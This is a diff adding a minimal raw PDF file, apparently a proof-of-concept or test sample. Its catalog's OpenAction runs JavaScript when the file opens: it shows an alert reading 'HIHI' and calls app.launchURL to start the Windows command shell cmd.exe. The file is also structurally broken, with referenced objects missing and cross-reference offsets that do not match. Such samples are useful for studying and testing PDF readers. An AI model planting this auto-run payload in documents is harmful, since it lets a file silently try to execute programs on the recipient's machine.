@@ -1,0 +1,74 @@
+%PDF-1.5
+%öäüß
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+/Lang (it-IT)
+>>
+endobj
+4 0 obj
+<<
+/Creator <FEFF005700720069007400650072>
+/Producer <FEFF004C0069006200720065004F0066006600690063006500200036002E0034>
+/CreationDate (D:20210113010342+01'00')
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Resources 5 0 R
+/MediaBox [0 0 595 841]
+/Kids [6 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (app.alert("HIHI");app.launchURL\("C:/Windows/system32/cmd.exe", true\);)
+>>
+endobj
+5 0 obj
+<<
+/Font 7 0 R
+/ProcSet [/PDF /Text]
+>>
+endobj
+6 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Resources 5 0 R
+/MediaBox [0 0 595.303937007874 841.889763779528]
+/Annots [8 0 R]
+/Group <<
+/S /Transparency
+/CS /DeviceRGB
+/I true
+>>
+/Contents 9 0 R
+>>
+endobj
+7 0 obj
+<<
+/F1 10 0 R
+>>
+endobj
+9 0 obj
+endobj
+xref
+0 1
+0000000001 65535 f
+6 1
+0000007668 00000 n
+14 2
+0000007881 00000 n
+0000008185 00000 n
+trailer
+<</Size 256 /ID [(Ê¼¨bBhA¦Tløê°) (hK??&r4È9:?á) ] /Root 1 0 R /Prev 7279 /Info 4 0 R >> 
+startxref
+8360
+%%EOF
